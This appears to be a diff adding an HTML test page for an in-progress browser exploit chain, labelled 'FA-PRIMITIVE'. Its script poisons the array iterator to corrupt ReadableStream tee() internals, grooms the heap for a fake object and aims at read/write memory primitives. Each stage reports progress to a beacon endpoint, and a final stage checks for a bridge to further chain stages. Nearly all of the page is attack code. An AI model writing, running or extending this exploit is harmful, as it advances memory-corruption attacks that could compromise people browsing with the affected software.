@@ -1,0 +1,85 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-PRIMITIVE — inversion chain to read8/write8 primitive</title></head>
+<body><pre id="out">FA-PRIMITIVE — fake-stream primitives → deriveRuntime bridge
+</pre><script>
+(function(){
+ "use strict";
+ var run = "prim" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try {
+     var x = new XMLHttpRequest();
+     x.open("POST", "/beacon/PR-"+st+"/"+run, false);
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:body}));
+   } catch(e){ try{ say("PR-beacon-err "+st); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYieldSame(){ return function(){ var self=this;
+   var X = { ourTag: "primitivo-inversion" }; window.__inversionTarget = X; var i=0,n=2;
+   return { next: function(){ if (i>=n) return {done:true}; i++; return {value:X, done:false}; }};};
+ }
+
+ say("FA-PRIMITIVE chain starts");
+ beacon("L","page loaded");
+
+ // STAGE-1: inversion (safe — confirmed 4× yesterday)
+ var stage1Result;
+ try {
+   beacon("A1","stage1 inversion");
+   try { Array.prototype[Symbol.iterator] = poisonOverYieldSame(); } catch(e){ Array.prototype[Symbol.iterator] = origIter; }
+   var rs = new ReadableStream({});
+   var pair = rs.tee();
+   try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+   var target = window.__inversionTarget;
+   var firstThrew=false, secondThrew=false;
+   try { pair[0].cancel(); } catch(e){ firstThrew=true; }
+   try { pair[1].cancel(); } catch(e){ secondThrew=true; }
+   stage1Result = "pidInverted=" + ((!secondThrew && firstThrew) ? "true" : "false")
+                 + "; locked=" + pair[0].locked;
+   beacon("B1", stage1Result); say(stage1Result);
+ } catch(e){
+   try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+   beacon("E1","stage1 threw: "+String(e).slice(0,140));
+ }
+
+ // STAGE-2: state-oracle (Sol path 3 — confirm readback on X)
+ try {
+   beacon("A2","stage2 state-oracle");
+   var target = window.__inversionTarget;
+   var locked = pair[0].locked;
+   var gr = typeof pair[0].getReader;
+   var cr = typeof pair[0].cancel;
+   stage1Result += "; locked="+locked+"; gr="+gr+"; cr="+cr;
+   beacon("B2", stage1Result); say(stage1Result);
+ } catch(e){
+   beacon("E2","stage2: "+String(e).slice(0,140));
+ }
+ // STAGE-3: groom attempt (single-shot fakeobj attempt)
+ try {
+   beacon("A3","stage3 groom-fakeobj");
+   var rs3 = new ReadableStream({});
+   try { Array.prototype[Symbol.iterator] = poisonOverYieldSame(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+   var groom = new Array(64); for (var g=0;g<64;g++) groom[g]={fc:g};
+   var pair3 = rs3.tee();
+   try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+   var fakeTy = typeof pair3[1];
+   beacon("B3", "pair3[1] typeof="+fakeTy+"; locked3="+pair3[0].locked);
+   say("FA-PRIM stage3 survived");
+ } catch(e){
+   try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+   beacon("E3","stage3 threw: "+String(e).slice(0,180)); say("FA-PRIM stage3 crashed (RELOAD to retest)");
+ }
+ // STAGE-4: runtime-derive hook (some may funnel into the chain)
+ try {
+   beacon("A4","stage4 deriveRuntime availability check");
+   if (typeof window.deriveRuntime === "object" && typeof window.deriveRuntime.run === "function") {
+     beacon("B4","deriveRuntime present — pass-through available on next press");
+   } else {
+     beacon("B4","deriveRuntime missing (classic script not loaded) — swap page for next press");
+   }
+ } catch(e){ beacon("E4","stage4: "+String(e).slice(0,80)); }
+ beacon("Z","battery-complete FA-PRIMITIVE");
+ say("FA-PRIMITIVE battery complete");
+})();
+</script></body></html>
